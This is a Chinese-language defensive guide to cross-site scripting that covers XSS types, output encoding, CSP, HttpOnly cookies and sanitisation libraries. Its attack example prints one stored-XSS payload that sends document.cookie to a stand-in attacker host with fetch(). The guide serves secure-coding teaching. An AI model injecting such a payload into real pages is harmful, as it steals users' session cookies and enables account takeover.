# XSS 跨站脚本攻击防御指南

## 什么是 XSS

跨站脚本攻击(Cross-Site Scripting, CWE-79)是指攻击者向 Web 页面注入恶意脚本, 当其他用户浏览该页面时, 脚本在受害者浏览器中执行, 从而窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击。

## XSS 的三种类型

1. **反射型 XSS**: 恶意脚本来自用户请求参数, 服务器将其"反射"回响应页面, 常见于搜索结果页。
2. **存储型 XSS**: 恶意脚本被持久化存储到数据库(如评论、个人简介), 所有访问者都会执行, 危害最大。
3. **DOM 型 XSS**: 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数), 数据不经过服务器。

## 攻击示例

评论功能未过滤输出, 攻击者提交:

```html
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

其他用户浏览评论页时, 会话 Cookie 被发送到攻击者服务器。

## 防御措施

### 1. 输出编码(核心防御)

根据输出上下文对数据进行 HTML 编码:

```javascript
// Vue 默认转义插值内容, 是安全的
<p>{{ userComment }}</p>
// v-html 会渲染原始 HTML, 仅用于可信内容
<div v-html="trustedHtml"></div>
```

```java
// Java 后端使用 OWASP Encoder
Encode.forHtml(userInput);
```

### 2. Content Security Policy(CSP)

通过响应头限制页面可加载的资源, 即使存在注入点, 外部脚本也无法执行:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### 3. HttpOnly Cookie

设置 HttpOnly 后, JavaScript 无法通过 `document.cookie` 读取会话标识:

```
Set-Cookie: SESSIONID=xxx; HttpOnly; Secure; SameSite=Lax
```

### 4. 输入校验与富文本净化

对富文本内容使用白名单过滤库(如 jsoup、DOMPurify), 只保留安全标签与属性。

### 5. 框架默认防护

现代前端框架(Vue、React)的模板插值默认转义, 应避免使用 `v-html`、`dangerouslySetInnerHTML` 处理用户输入。

## 验证与测试建议

- 对所有用户输入回显点进行编码验证
- 使用自动化扫描器检测 XSS 漏洞
- 在 CI 中加入安全编码规范检查
